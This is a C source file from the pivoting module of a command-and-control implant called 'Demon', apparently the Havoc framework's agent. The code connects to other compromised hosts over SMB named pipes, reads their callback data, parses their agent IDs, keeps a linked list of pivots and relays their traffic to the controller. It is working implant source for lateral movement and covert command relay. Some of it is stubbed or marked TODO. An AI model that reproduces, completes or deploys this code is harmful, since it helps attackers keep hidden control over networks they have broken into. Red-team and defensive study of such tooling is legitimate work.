#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Parser.h>
#include <Core/MiniStd.h>
#include <Core/Command.h>
#include <Core/Package.h>

BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
{
    PPIVOT_DATA Data    = NULL;
    HANDLE      Handle  = NULL;
    PARSER      Parser  = { 0 };

    Handle = Instance->Win32.CreateFileA( NamedPipe, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );

    if ( ! Handle )
    {
        PRINTF( "CreateFileA: Failed[%d]\n", NtGetLastError() );
        return FALSE;
    }

    if ( NtGetLastError() == ERROR_PIPE_BUSY )
    {
        if ( ! Instance->Win32.WaitNamedPipeA( NamedPipe, 5000 ) )
        {
            PUTS( "Could not open pipe: 5 second wait timed out." );
            return FALSE;
        }
    }

    do
    {
        // TODO: first get the size then parse
        if ( Instance->Win32.PeekNamedPipe( Handle, NULL, 0, NULL, BytesSize, NULL ) )
        {
            if ( *BytesSize > 0 )
            {
                PRINTF( "BytesSize => %d\n", *BytesSize );

                *Output = Instance->Win32.LocalAlloc( LPTR, *BytesSize );
                MemSet( *Output, 0, *BytesSize );

                if ( Instance->Win32.ReadFile( Handle, *Output, *BytesSize, BytesSize, NULL ) )
                {
                    PRINTF( "BytesSize Read => %d\n", *BytesSize );
                    break;
                }
                else
                {
                    PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
                    return FALSE;
                }
            }
        }
        else
        {
            PRINTF( "PeekNamedPipe: Failed[%d]\n", NtGetLastError() );
            return FALSE;
        }
    } while ( TRUE );

    PUTS( "Adding pivot data to the list" )
    // Adding data to the list
    {
        PRINTF( "Pivot :: Output[%p] Size[%d]\n", *Output, *BytesSize )

        Data           = Instance->Win32.LocalAlloc( LPTR, sizeof( PIVOT_DATA ) );
        Data->PipeName = NamedPipe;
        Data->Handle   = Handle;
        Data->Next     = NULL;
        Data->DemonID  = PivotParseDemonID( *Output, *BytesSize );

        if ( ! Instance->SmbPivots )
        {
            Instance->SmbPivots = Data;
        }
        else
        {
            PUTS( "Else" )
            PPIVOT_DATA PivotList = Instance->SmbPivots;

            do
            {
                if ( PivotList )
                {
                    if ( PivotList->Next )
                        PivotList = PivotList->Next;

                    else
                    {
                        PivotList->Next = Data;
                        break;
                    }
                }
                else
                {
                    PUTS( "break" )
                    break;
                }
            } while ( TRUE );
        }
    }

    return TRUE;
}

// TODO: remove from linked list and close connection
BOOL PivotRemove( DWORD DemonId )
{
    BOOL Success = FALSE;

    return Success;
}

VOID PivotCollectOutput()
{
    PPACKAGE    Package   = PackageCreate( DEMON_COMMAND_PIVOT );
    PPIVOT_DATA TempList  = Instance->SmbPivots;
    DWORD       BytesSize = 0;
    DWORD       Length    = 0;
    PVOID       Output    = NULL;

    // TODO: send everything back.
    do
    {
        if ( ! TempList )
            break;

        if ( TempList->Handle )
        {
            if ( Instance->Win32.PeekNamedPipe( TempList->Handle, NULL, 0, NULL, &BytesSize, NULL ) )
            {
                if ( BytesSize >= sizeof( UINT32 ) )
                {
                    if ( Instance->Win32.PeekNamedPipe( TempList->Handle, &Length, sizeof( UINT32 ), NULL, &BytesSize, NULL ) )
                    {
                        Length = __builtin_bswap32( Length ) + sizeof( UINT32 );
                        // PRINTF( "Peeked Package Length => %x\n", Length );

                        Output = Instance->Win32.LocalAlloc( LPTR, Length );
                        if ( Instance->Win32.ReadFile( TempList->Handle, Output, Length, &BytesSize, NULL ) )
                        {
                            // PRINTF( "[DEMON_PIVOT_SMB_COMMAND] Read Command => %d\n", BytesSize );
                            PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
                            PackageAddBytes( Package, Output, BytesSize );
                            PackageTransmit( Package, NULL, NULL );
                        }
                        else
                        {
                            PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
                        }

                        MemSet( Output, 0, Length );
                        Instance->Win32.LocalFree( Output );
                        Output = NULL;
                    }
                }
            }
            else
            {
                PRINTF( "PeekNamedPipe: Failed[%d]\n", NtGetLastError() );

                if ( NtGetLastError() == ERROR_BROKEN_PIPE )
                {
                    PUTS( "ERROR_BROKEN_PIPE :: Pivot disconnected" )
                    TempList->Handle = NULL;

                    PivotRemove( TempList->DemonID );

                    PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
                    PackageAddInt32( Package, TempList->DemonID );

                    PackageTransmit( Package, NULL, NULL );

                    return;
                }

                SEND_WIN32_BACK
                PackageDestroy( Package );
            }
        }

        // select the next pivot
        TempList = TempList->Next;

    } while ( TRUE );
}


UINT32 PivotParseDemonID( PVOID Response, SIZE_T Size )
{
    PARSER Parser  = { 0 };
    UINT32 Value   = 0;

    ParserNew( &Parser, Response, Size );

    ParserGetInt32( &Parser );
    ParserGetInt32( &Parser );

    Value = __builtin_bswap32( ParserGetInt32( &Parser ) );

    PRINTF( "Parsed DemonID => %x\n", Value );

    ParserDestroy( &Parser );

    return Value;
}